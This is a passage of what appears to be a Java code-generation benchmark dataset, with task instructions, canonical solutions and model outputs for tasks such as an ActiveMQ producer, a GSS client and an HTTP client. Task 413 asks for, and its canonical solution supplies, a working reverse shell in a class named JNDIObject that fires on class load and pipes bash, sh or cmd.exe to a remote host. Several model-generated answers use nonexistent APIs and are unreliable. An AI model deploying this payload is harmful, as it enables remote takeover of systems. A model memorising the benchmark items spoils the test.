    "right_result": "import java.io.*;\nimport java.net.*;\nimport org.ietf.jgss.*;\n\npublic class GSSClient {\n    private Socket s;\n\n    public static void main(String[] args) {\n        GSSClient client = new GSSClient();\n        client.parseArgs(args);\n    }\n\n    private void parseArgs(String[] args) {\n        if (args.length < 2) {\n            usage();\n            exit(1);\n        }\n        String host = args[0];\n        int port = Integer.parseInt(args[1]);\n        try {\n            s = new Socket(host, port);\n            print(\"Connected to server.\");\n            createCtxt(\"host\", new Oid(\"1.3.6.1.5.5.2.3.4\"));\n            BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream()));\n            PrintWriter out = new PrintWriter(s.getOutputStream(), true);\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                verifyMsgFromPeer(createCtxt(\"host\", new Oid(\"1.3.6.1.5.5.2.3.4\")), inputLine);\n                print(\"Received: \" + inputLine);\n            }\n        } catch (Exception e) {\n            print(\"Error: \" + e.getMessage());\n            exit(1);\n        } finally {\n            try {\n                if (s != null) s.close();\n            } catch (IOException e) {\n                print(\"Error closing socket: \" + e.getMessage());\n            }\n        }\n    }\n\n    public GSSContext createCtxt(String serverName, Oid mechOid) throws Exception {\n        GSSManager manager = GSSManager.getInstance();\n        GSSCredential serverCred = manager.createCredential(null, GSSCredential.INITIATE_ONLY, mechOid, GSSCredential.DEFAULT_FLAGS);\n        GSSContext context = manager.createContext(serverName, mechOid, serverCred, GSSContext.DEFAULT_LIFETIME);\n        byte[] token = new byte[0];\n        while (true) {\n            byte[] tokenOut = context.initSecContext(token, 0, token.length);\n            if (tokenOut.length == 0) break;\n            sendMsgToPeer(context, new String(tokenOut));\n            token = new byte[context.getRemainingTokenLength()];\n            int len = s.getInputStream().read(token, 0, token.length);\n            if (len < 0) throw new IOException(\"Connection closed by server\");\n        }\n        return context;\n    }\n\n    public void sendMsgToPeer(GSSContext aCtxt, String msg) throws Exception {\n        byte[] token = aCtxt.wrap(msg.getBytes(), 0, msg.length(), 0);\n        PrintWriter out = new PrintWriter(s.getOutputStream(), true);\n        out.write(new String(token));\n        out.flush();\n    }\n\n    public void verifyMsgFromPeer(GSSContext aCtxt, String msg) throws Exception {\n        byte[] token = msg.getBytes();\n        aCtxt.unwrap(token, 0, token.length);\n    }\n\n    public void usage() {\n        System.out.println(\"Usage: java GSSClient <host> <port>\");\n    }\n\n    public void print(String msg) {\n        System.out.println(msg);\n    }\n\n    public void exit(int status) {\n        System.exit(status);\n    }\n}"
  },
  {
    "Task_id": 4,
    "Instruction": "Task Description: Create a Java class that implements an ActiveMQ message producer capable of sending messages to both queues and topics.\n\nClass Description: The JmsProducer class is responsible for establishing a connection to an ActiveMQ broker, creating both queue and topic destinations, and sending multiple text messages to each destination. It handles connection management and includes error handling for JMS operations.\n\nAttributes:\n- USERNAME: [String] - Default username for ActiveMQ connection (default: ActiveMQConnection.DEFAULT_USER)\n- PASSWORD: [String] - Default password for ActiveMQ connection (default: ActiveMQConnection.DEFAULT_PASSWORD)\n- BROKEURL: [String] - Default broker URL for ActiveMQ connection (default: ActiveMQConnection.DEFAULT_BROKER_URL)\n- SENDNUM: [int] - Number of messages to send to each destination (default: 10)\n\nMethods:\n- run(): [void] - Main method that establishes the connection, creates destinations (queue and topic), and initiates message sending. Handles connection lifecycle and error cases.\n- sendMessage(Session session, MessageProducer messageProducer, String type): [void] - Helper method that creates and sends multiple text messages with timestamps to the specified destination. \n  Parameters:\n    - session: [Session] - JMS session for message creation\n    - messageProducer: [MessageProducer] - Producer for sending messages\n    - type: [String] - Destination type identifier (\"QUEUE\" or \"TOPIC\") for logging purposes",
    "Canonical_solution": "import javax.jms.Connection;\nimport javax.jms.ConnectionFactory;\nimport javax.jms.Destination;\nimport javax.jms.JMSException;\nimport javax.jms.MessageProducer;\nimport javax.jms.Session;\nimport javax.jms.TextMessage;\nimport org.apache.activemq.ActiveMQConnection;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class JmsProducer {\n\n    private static final String USERNAME = ActiveMQConnection.DEFAULT_USER;\n    private static final String PASSWORD = ActiveMQConnection.DEFAULT_PASSWORD;\n    private static final String BROKEURL = ActiveMQConnection.DEFAULT_BROKER_URL;\n    private static final int SENDNUM = 10;\n\n    public static void run() {\n        ConnectionFactory connectionFactory;\n        Connection connection = null;\n        Session session;\n        Destination destination;\n        MessageProducer messageProducer;\n        \n        connectionFactory = new ActiveMQConnectionFactory(JmsProducer.USERNAME, JmsProducer.PASSWORD, JmsProducer.BROKEURL);\n        try {\n            connection = connectionFactory.createConnection();\n            connection.start();\n            session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);\n            destination = session.createQueue(\"SAMPLE_MQ_QUEUE\");\n            messageProducer = session.createProducer(destination);\n            sendMessage(session, messageProducer, \"QUEUE\");\n\n            destination = session.createTopic(\"SAMPLE_MQ_TOPIC\");\n            messageProducer = session.createProducer(destination);\n            sendMessage(session, messageProducer, \"TOPIC\");\n            session.commit();\n            Thread.sleep(1000);\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (connection != null) {\n                try {\n                    connection.close();\n                } catch (JMSException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public static void sendMessage(Session session, MessageProducer messageProducer, String type) throws Exception {\n        for (int i = 0; i < JmsProducer.SENDNUM; i++) {\n            Date date = new Date();\n            TextMessage message = session.createTextMessage(\"ActiveMQ \u53d1\u9001\u6d88\u606f\u65f6\u95f4\uff1a\" + date);\n            System.out.println(\"\\t\" + type + \"\\t\u53d1\u9001\u6d88\u606f\uff1aActivemq \u53d1\u9001\u6d88\u606f\u65f6\u95f4\uff1a\" + date);\n            messageProducer.send(message);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 38,
    "right_result": "import javax.jms.Connection;\nimport javax.jms.ConnectionFactory;\nimport javax.jms.Destination;\nimport javax.jms.MessageProducer;\nimport javax.jms.Session;\nimport javax.jms.TextMessage;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class JmsProducer {\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"admin\";\n    private static final String BROKER_URL = \"tcp://localhost:61616\";\n    private static final int SEND_NUM = 10;\n\n    public void run() {\n        ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(USERNAME, PASSWORD, BROKER_URL);\n        Connection connection = null;\n        Session session = null;\n        MessageProducer queueProducer = null;\n        MessageProducer topicProducer = null;\n\n        try {\n            connection = connectionFactory.createConnection();\n            connection.start();\n            session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n\n            Destination queue = session.createQueue(\"TestQueue\");\n            Destination topic = session.createTopic(\"TestTopic\");\n\n            queueProducer = session.createProducer(queue);\n            topicProducer = session.createProducer(topic);\n\n            sendMessage(session, queueProducer, \"QUEUE\");\n            sendMessage(session, topicProducer, \"TOPIC\");\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (topicProducer != null) topicProducer.close();\n                if (queueProducer != null) queueProducer.close();\n                if (session != null) session.close();\n                if (connection != null) connection.close();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void sendMessage(Session session, MessageProducer messageProducer, String type) throws Exception {\n        for (int i = 0; i < SEND_NUM; i++) {\n            TextMessage message = session.createTextMessage(\"Message \" + i + \" sent to \" + type + \" at \" + System.currentTimeMillis());\n            messageProducer.send(message);\n        }\n    }\n}"
  },
  {
    "Task_id": 406,
    "Instruction": "Task Description: Write a Java function that tests a server's handling of a malformed HTTP request by sending a bad request and verifying the server's response.\n\nFunction Description: The function `testBadRequest` attempts to send a deliberately malformed HTTP POST request to a server and verifies that the server responds with a \"400 Bad Request\" error. The function creates a TCP socket connection to the server, sends the malformed request, reads the server's response, and compares it to the expected response. If the response matches, the test passes; otherwise, it may throw an IOException if the connection is closed prematurely.\n\nInput: None (The server address and port are obtained from `DefaultServer.getDefaultServerAddress()` internally)\n\nOutput: None (The function asserts the server's response matches the expected \"400 Bad Request\" response. Any mismatch or IOException will result in a test failure or exception.)",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.Socket;\n\npublic void testBadRequest() throws IOException {\n    String request = \"POST /\\r HTTP/1.1\\r\\nTrailer:foo, bar\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n9\\r\\nabcdefghi\\r\\n0\\r\\nfoo: fooVal\\r\\n bar: barVal\\r\\n\\r\\n\";\n    String response1 = \"HTTP/1.1 400 Bad Request\\r\\nContent-Length: 0\\r\\nConnection: close\\r\\n\\r\\n\";\n    Socket s = new Socket(DefaultServer.getDefaultServerAddress().getAddress(), DefaultServer.getDefaultServerAddress().getPort());\n    try {\n        s.getOutputStream().write(request.getBytes());\n\n        StringBuilder sb = new StringBuilder();\n        int read = 0;\n        byte[] buf = new byte[100];\n        while (read < response1.length()) {\n            int r = s.getInputStream().read(buf);\n            if (r <= 0) break;\n            if (r > 0) {\n                read += r;\n                sb.append(new String(buf, 0, r));\n            }\n        }\n        Assert.assertEquals(response1, sb.toString());\n\n    } catch (IOException expected) {\n        //this can happen as well, as in some cases we may not have fully consumed the read side\n        //before the connection is shutdown, namely when we are running in test.single\n    } finally {\n        s.close();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "right_result": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class TestBadRequest {\n    public static void testBadRequest() throws Exception {\n        String[] serverAddress = DefaultServer.getDefaultServerAddress();\n        int port = Integer.parseInt(serverAddress[1]);\n        Socket socket = new Socket(serverAddress[0], port);\n        OutputStream output = socket.getOutputStream();\n        BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        \n        // Malformed HTTP request\n        String request = \"POST / HTTP/1.1\\r\\nHost: example.com\\r\\nContent-Length: 5\\r\\n\\r\\nabcde\";\n        output.write(request.getBytes());\n        output.flush();\n        \n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = input.readLine()) != null) {\n            response.append(line).append(\"\\n\");\n            if (line.isEmpty()) break;\n        }\n        \n        if (!response.toString().startsWith(\"HTTP/1.1 400 Bad Request\")) {\n            throw new IOException(\"Server did not respond with 400 Bad Request\");\n        }\n        \n        socket.close();\n    }\n}"
  },
  {
    "Task_id": 413,
    "Instruction": "Task Description: Create a Java class that establishes a reverse shell connection to a remote server using TCP protocol, with cross-platform compatibility for both Windows and Unix-like systems.\n\nClass Description: The JNDIObject class creates a reverse shell by spawning a local shell process (bash/sh on Unix, cmd.exe on Windows) and redirecting its input/output streams to a remote server via a TCP socket connection. The class includes platform detection logic to determine the appropriate shell to spawn.\n\nAttributes:\n- ip: String - The IP address of the remote server to connect to\n- port: String - The port number of the remote server to connect to\n- py_path: String - Path to Python interpreter (used for Unix-like systems)\n- cmd: String[] - The command array used to spawn the shell process\n\nMethods:\n- <static initializer>: () -> void - Automatically executes when the class is loaded, handles the entire reverse shell setup and connection process\n  - Detects operating system\n  - Finds appropriate shell or Python interpreter\n  - Spawns shell process\n  - Establishes socket connection\n  - Manages stream redirection between process and socket\n  - Handles cleanup on termination\n\nNote: The class uses a static initializer block rather than explicit methods to automatically execute its functionality when loaded. The implementation includes error handling and resource cleanup (closing sockets and destroying processes).",
    "Canonical_solution": "import java.io.File;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class JNDIObject {\n    static {\n        try{\n            String ip = \"your-vps-ip\";\n            String port = \"443\";\n            String py_path = null;\n            String[] cmd;\n            if (!System.getProperty(\"os.name\").toLowerCase().contains(\"windows\")) {\n                String[] py_envs = new String[]{\"/bin/python\", \"/bin/python3\", \"/usr/bin/python\", \"/usr/bin/python3\", \"/usr/local/bin/python\", \"/usr/local/bin/python3\"};\n                for(int i = 0; i < py_envs.length; ++i) {\n                    String py = py_envs[i];\n                    if ((new File(py)).exists()) {\n                        py_path = py;\n                        break;\n                    }\n                }\n                if (py_path != null) {\n                    if ((new File(\"/bin/bash\")).exists()) {\n                        cmd = new String[]{py_path, \"-c\", \"import pty;pty.spawn(\\\"/bin/bash\\\")\"};\n                    } else {\n                        cmd = new String[]{py_path, \"-c\", \"import pty;pty.spawn(\\\"/bin/sh\\\")\"};\n                    }\n                } else {\n                    if ((new File(\"/bin/bash\")).exists()) {\n                        cmd = new String[]{\"/bin/bash\"};\n                    } else {\n                        cmd = new String[]{\"/bin/sh\"};\n                    }\n                }\n            } else {\n                cmd = new String[]{\"cmd.exe\"};\n            }\n            Process p = (new ProcessBuilder(cmd)).redirectErrorStream(true).start();\n            Socket s = new Socket(ip, Integer.parseInt(port));\n            InputStream pi = p.getInputStream();\n            InputStream pe = p.getErrorStream();\n            InputStream si = s.getInputStream();\n            OutputStream po = p.getOutputStream();\n            OutputStream so = s.getOutputStream();\n            while(!s.isClosed()) {\n                while(pi.available() > 0) {\n                    so.write(pi.read());\n                }\n                while(pe.available() > 0) {\n                    so.write(pe.read());\n                }\n                while(si.available() > 0) {\n                    po.write(si.read());\n                }\n                so.flush();\n                po.flush();\n                Thread.sleep(50L);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {\n                }\n            }\n            p.destroy();\n            s.close();\n        }catch (Throwable e){\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "import java.io.*;\nimport java.net.*;\nimport java.lang.reflect.*;\n\npublic class JNDIObject {\n    static String ip;\n    static String port;\n    static String py_path;\n    static String[] cmd;\n\n    static {\n        try {\n            ip = \"127.0.0.1\";\n            port = \"4444\";\n            py_path = \"/usr/bin/python3\";\n            cmd = new String[0];\n\n            // Detect OS\n            String os = System.getProperty(\"os.name\").toLowerCase();\n            if (os.contains(\"win\")) {\n                cmd = new String[] {\"cmd.exe\", \"/c\", \"start\", \"cmd.exe\"};\n            } else {\n                cmd = new String[] {\"bash\", \"-c\", \"sh -i\"};\n            }\n\n            // Create socket connection\n            Socket socket = new Socket(ip, Integer.parseInt(port));\n            InputStream in = socket.getInputStream();\n            OutputStream out = socket.getOutputStream();\n            PrintWriter writer = new PrintWriter(out, true);\n\n            // Spawn shell process\n            ProcessBuilder pb = new ProcessBuilder(cmd);\n            pb.redirectErrorStream(true);\n            Process process = pb.start();\n            InputStream processIn = process.getInputStream();\n            OutputStream processOut = process.getOutputStream();\n\n            // Redirect streams\n            Thread inputThread = new Thread(() -> {\n                byte[] buffer = new byte[1024];\n                int length;\n                try {\n                    while ((length = processIn.read(buffer)) > 0) {\n                        out.write(buffer, 0, length);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n            Thread outputThread = new Thread(() -> {\n                byte[] buffer = new byte[1024];\n                int length;\n                try {\n                    while ((length = in.read(buffer)) > 0) {\n                        processOut.write(buffer, 0, length);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n\n            inputThread.start();\n            outputThread.start();\n\n            // Cleanup on termination\n            Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n                try {\n                    if (socket != null) socket.close();\n                    if (process != null) process.destroy();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 414,
    "Instruction": "Task Description: Create a Java class that handles TCP socket communication for receiving screen data from an Android device via minicap and forwarding it to a data queue for processing.\n\nClass Description: MiniCapInputSocketThread is a thread class that establishes a TCP connection to a local port forwarded from an Android device, continuously reads screen data from the minicap service, and places the data into a blocking queue for further processing by other components. It also manages resource cleanup when the connection is terminated.\n\nAttributes:\n- log: Logger - Logger instance for logging debug and status information\n- iDevice: IDevice - The Android device being monitored\n- dataQueue: BlockingQueue<byte[]> - Queue for storing received screen data\n- miniCapPro: MiniCapLocalThread - The parent minicap process thread\n- androidTestTaskBootThread: AndroidTestTaskBootThread - The main Android test task thread\n- session: Session - WebSocket session associated with the screen streaming\n\nMethods:\n- MiniCapInputSocketThread(IDevice, BlockingQueue<byte[]>, MiniCapLocalThread, Session) -> None - Constructor that initializes the thread with device, data queue, minicap process, and session references\n- run() -> None - Main thread execution that establishes the socket connection, reads data continuously, and handles cleanup when finished",
    "Canonical_solution": "import com.android.ddmlib.IDevice;\nimport jakarta.websocket.Session;\nimport org.cloud.sonic.agent.bridge.android.AndroidDeviceBridgeTool;\nimport org.cloud.sonic.agent.common.maps.ScreenMap;\nimport org.cloud.sonic.agent.tests.android.AndroidTestTaskBootThread;\nimport org.cloud.sonic.agent.tools.PortTool;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.Socket;\nimport java.util.concurrent.BlockingQueue;\n\nimport static org.cloud.sonic.agent.tools.BytesTool.subByteArray;\n\npublic class MiniCapInputSocketThread extends Thread {\n\n    private final Logger log = LoggerFactory.getLogger(MiniCapInputSocketThread.class);\n\n    public final static String ANDROID_INPUT_SOCKET_PRE = \"android-minicap-input-socket-task-%s-%s-%s\";\n\n    private IDevice iDevice;\n    private BlockingQueue<byte[]> dataQueue;\n    private MiniCapLocalThread miniCapPro;\n    private AndroidTestTaskBootThread androidTestTaskBootThread;\n    private Session session;\n\n    public MiniCapInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, MiniCapLocalThread miniCapPro, Session session) {\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.miniCapPro = miniCapPro;\n        this.session = session;\n        this.androidTestTaskBootThread = miniCapPro.getAndroidTestTaskBootThread();\n        this.setDaemon(false);\n        this.setName(androidTestTaskBootThread.formatThreadName(ANDROID_INPUT_SOCKET_PRE));\n    }\n\n    @Override\n    public void run() {\n        int finalMiniCapPort = PortTool.getPort();\n        AndroidDeviceBridgeTool.forward(iDevice, finalMiniCapPort, \"minicap\");\n        Socket capSocket = null;\n        InputStream inputStream = null;\n        try {\n            capSocket = new Socket(\"localhost\", finalMiniCapPort);\n            inputStream = capSocket.getInputStream();\n            int len = 1024;\n            while (miniCapPro.isAlive()) {\n                byte[] buffer = new byte[len];\n                int realLen;\n                realLen = inputStream.read(buffer);\n                if (buffer.length != realLen && realLen >= 0) {\n                    buffer = subByteArray(buffer, 0, realLen);\n                }\n                if (realLen >= 0) {\n                    dataQueue.offer(buffer);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (miniCapPro.isAlive()) {\n                miniCapPro.interrupt();\n                log.info(\"miniCap thread closed.\");\n            }\n            if (capSocket != null && capSocket.isConnected()) {\n                try {\n                    capSocket.close();\n                    log.info(\"miniCap socket closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (inputStream != null) {\n                try {\n                    inputStream.close();\n                    log.info(\"miniCap input stream closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        AndroidDeviceBridgeTool.removeForward(iDevice, finalMiniCapPort, \"minicap\");\n        if (session != null) {\n            ScreenMap.getMap().remove(session);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.logging.Logger;\n\npublic class MiniCapInputSocketThread extends Thread {\n    private final Logger log;\n    private final IDevice iDevice;\n    private final BlockingQueue<byte[]> dataQueue;\n    private final MiniCapLocalThread miniCapPro;\n    private final Session session;\n    private Socket socket;\n    private InputStream inputStream;\n\n    public MiniCapInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, MiniCapLocalThread miniCapPro, Session session) {\n        this.log = Logger.getLogger(MiniCapInputSocketThread.class.getName());\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.miniCapPro = miniCapPro;\n        this.session = session;\n    }\n\n    @Override\n    public void run() {\n        try {\n            String host = iDevice.getForwardedHost();\n            int port = iDevice.getForwardedPort();\n            socket = new Socket();\n            socket.connect(new InetSocketAddress(host, port), 5000);\n            inputStream = socket.getInputStream();\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n\n            while (miniCapPro.isRunning()) {\n                if (inputStream.available() > 0) {\n                    bytesRead = inputStream.read(buffer);\n                    if (bytesRead > 0) {\n                        dataQueue.put(buffer);\n                    }\n                }\n            }\n        } catch (IOException | InterruptedException e) {\n            log.severe(\"Error in MiniCapInputSocketThread: \" + e.getMessage());\n        } finally {\n            try {\n                if (inputStream != null) inputStream.close();\n                if (socket != null) socket.close();\n            } catch (IOException e) {\n                log.severe(\"Error closing resources in MiniCapInputSocketThread: \" + e.getMessage());\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 44,
    "Instruction": "Task Description: Create a Java class that handles HTTP communication with a hub service, specifically for device registration and key management.\n\nClass Description: The HubHttpClient class provides functionality to register a device with a remote hub service using HTTP requests. It handles JSON serialization, authentication, and response processing, while supporting asynchronous operations.\n\nAttributes:\n- JSON: ObjectMapper - A static instance for JSON serialization/deserialization\n- EXPECTED_RESPONSE_CODES: List<Integer> - List of acceptable HTTP response codes\n- hubConfig: HubConfig - Configuration for the hub service\n- bearerToken: String - Authentication token for API requests\n- deviceId: String - Unique identifier for the device\n- keyPair: P384KeyPair - Cryptographic key pair for the device\n- result: CompletableFuture<ReceivedKey> - Future for asynchronous result handling\n- httpClient: HttpClient - HTTP client for making requests\n\nMethods:\n- HubHttpClient(ExecutorService, HubConfig, String, DeviceKey, CompletableFuture<ReceivedKey>, AtomicReference<String>) -> None - Constructor that initializes the HTTP client with configuration and credentials\n- registerDevice(String) -> None - Registers a device with the hub service using the provided device name\n- toJson(CreateDeviceDto) -> String - Serializes a DTO to JSON string\n- handleResponse(HttpResponse<Void>) -> HttpResponse<Void> - Processes the HTTP response\n- registrationFailed(Throwable) -> None - Handles failed registration attempts\n\nNested Class:\n- CreateDeviceDto - Data transfer object for device registration containing:\n  * id: String - Device identifier\n  * name: String - Device name\n  * type: String - Constant device type (\"DESKTOP\")\n  * publicKey: String - Base64-encoded public key",
    "Canonical_solution": "import com.auth0.jwt.JWT;\nimport com.auth0.jwt.interfaces.DecodedJWT;\nimport com.fasterxml.jackson.core.JacksonException;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.cryptomator.common.settings.DeviceKey;\nimport org.cryptomator.cryptolib.common.P384KeyPair;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Base64;\nimport java.util.List;\nimport java.util.Objects;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class HubHttpClient {\n\n\tprivate static final ObjectMapper JSON = new ObjectMapper().setDefaultLeniency(true);\n\tprivate static final List<Integer> EXPECTED_RESPONSE_CODES = List.of(201, 409);\n\n\tprivate final HubConfig hubConfig;\n\tprivate final String bearerToken;\n\tprivate final String deviceId;\n\tprivate final P384KeyPair keyPair;\n\tprivate final CompletableFuture<ReceivedKey> result;\n\tprivate final HttpClient httpClient;\n\n\tpublic HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, DeviceKey deviceKey, CompletableFuture<ReceivedKey> result, AtomicReference<String> bearerToken) {\n\t\tthis.hubConfig = hubConfig;\n\t\tthis.deviceId = deviceId;\n\t\tthis.keyPair = Objects.requireNonNull(deviceKey.get());\n\t\tthis.result = result;\n\t\tthis.bearerToken = Objects.requireNonNull(bearerToken.get());\n\t\tthis.httpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).executor(executor).build();\n\t}\n\n\tpublic void registerDevice(String deviceName) {\n\t\tvar deviceUri = URI.create(hubConfig.devicesResourceUrl + deviceId);\n\t\tvar deviceKey = keyPair.getPublic().getEncoded();\n\t\tvar dto = new CreateDeviceDto();\n\t\tdto.id = deviceId;\n\t\tdto.name = deviceName;\n\t\tdto.publicKey = Base64.getUrlEncoder().withoutPadding().encodeToString(deviceKey);\n\t\tvar json = toJson(dto);\n\t\tvar request = HttpRequest.newBuilder(deviceUri)\n\t\t\t\t.PUT(HttpRequest.BodyPublishers.ofString(json, StandardCharsets.UTF_8))\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.header(\"Content-Type\", \"application/json\")\n\t\t\t\t.build();\n\t\thttpClient.sendAsync(request, HttpResponse.BodyHandlers.discarding())\n\t\t\t\t.thenApply(response -> {\n\t\t\t\t\tif (EXPECTED_RESPONSE_CODES.contains(response.statusCode())) {\n\t\t\t\t\t\treturn response;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tthrow new RuntimeException(\"Server answered with unexpected status code \" + response.statusCode());\n\t\t\t\t\t}\n\t\t\t\t}).handle((response, throwable) -> {\n\t\t\t\t\tif (response != null) {\n\t\t\t\t\t\treturn handleResponse(response);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tregistrationFailed(throwable);\n\t\t\t\t\t\treturn null;\n\t\t\t\t\t}\n\t\t\t\t});\n\t}\n\n\tprivate String toJson(CreateDeviceDto dto) {\n\t\ttry {\n\t\t\treturn JSON.writer().writeValueAsString(dto);\n\t\t} catch (JacksonException e) {\n\t\t\tthrow new IllegalStateException(\"Failed to serialize DTO\", e);\n\t\t}\n\t}\n\n\tprivate HttpResponse<Void> handleResponse(HttpResponse<Void> voidHttpResponse) {\n\t\tassert EXPECTED_RESPONSE_CODES.contains(voidHttpResponse.statusCode());\n\t\treturn voidHttpResponse;\n\t}\n\n\tprivate void registrationFailed(Throwable cause) {\n\t\tresult.completeExceptionally(cause);\n\t}\n\n\tprivate static class CreateDeviceDto {\n\t\tpublic String id;\n\t\tpublic String name;\n\t\tpublic final String type = \"DESKTOP\";\n\t\tpublic String publicKey;\n\t}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "import java.util.List;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.atomic.AtomicReference;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport javax.crypto.interfaces.P384KeyPair;\n\npublic class HubHttpClient {\n    public static final ObjectMapper JSON = new ObjectMapper();\n    public static final List<Integer> EXPECTED_RESPONSE_CODES = List.of(200, 201);\n\n    private final HttpClient httpClient;\n    private final HubConfig hubConfig;\n    private final String bearerToken;\n    private final String deviceId;\n    private final P384KeyPair keyPair;\n    private final CompletableFuture<ReceivedKey> result;\n    private final AtomicReference<String> deviceName;\n\n    public HubHttpClient(ExecutorService executor, HubConfig hubConfig, String bearerToken, DeviceKey deviceKey, CompletableFuture<ReceivedKey> result, AtomicReference<String> deviceName) {\n        this.httpClient = HttpClient.newBuilder().executor(executor).build();\n        this.hubConfig = hubConfig;\n        this.bearerToken = bearerToken;\n        this.deviceId = deviceKey.getId();\n        this.keyPair = deviceKey.getKeyPair();\n        this.result = result;\n        this.deviceName = deviceName;\n    }\n\n    public void registerDevice(String deviceName) {\n        CreateDeviceDto dto = new CreateDeviceDto(deviceId, deviceName, \"DESKTOP\", Base64.getEncoder().encodeToString(keyPair.getPublic().getEncoded()));\n        String json = toJson(dto);\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(hubConfig.getRegisterUrl())\n                .header(\"Authorization\", \"Bearer \" + bearerToken)\n                .header(\"Content-Type\", \"application/json\")\n                .POST(HttpRequest.BodyPublishers.ofString(json))\n                .build();\n\n        httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())\n                .thenApply(HttpResponse::body)\n                .thenApply(this::handleResponse)\n                .exceptionally(Throwable::getMessage)\n                .thenAccept(response -> {\n                    if (response.statusCode() == 200 || response.statusCode() == 201) {\n                        try {\n                            ReceivedKey receivedKey = JSON.readValue(response.body(), ReceivedKey.class);\n                            result.complete(receivedKey);\n                        } catch (Exception e) {\n                            registrationFailed(e);\n                        }\n                    } else {\n                        registrationFailed(new RuntimeException(\"Unexpected response code: \" + response.statusCode()));\n                    }\n                });\n    }\n\n    private String toJson(CreateDeviceDto dto) {\n        try {\n            return JSON.writeValueAsString(dto);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to serialize DTO to JSON\", e);\n        }\n    }\n\n    private HttpResponse<Void> handleResponse(HttpResponse<String> response) {\n        if (EXPECTED_RESPONSE_CODES.contains(response.statusCode())) {\n            return HttpResponse.newBuilder().statusCode(response.statusCode()).body(null).build();\n        } else {\n            throw new RuntimeException(\"Unexpected response code: \" + response.statusCode());\n        }\n    }\n\n    private void registrationFailed(Throwable throwable) {\n        result.completeExceptionally(throwable);\n    }\n\n    public static class CreateDeviceDto {\n        private String id;\n        private String name;\n        private String type;\n        private String publicKey;\n\n        public CreateDeviceDto(String id, String name, String type, String publicKey) {\n            this.id = id;\n            this.name = name;\n            this.type = type;\n            this.publicKey = publicKey;\n        }\n\n        // Getters and setters\n        public String getId() { return id; }\n        public void setId(String id) { this.id = id; }\n        public String getName() { return name; }\n        public void setName(String name) { this.name = name; }\n        public String getType() { return type; }\n        public void setType(String type) { this.type = type; }\n        public String getPublicKey() { return publicKey; }\n        public void setPublicKey(String publicKey) { this.publicKey = publicKey; }\n    }\n}"
  },
  {
    "Task_id": 454,
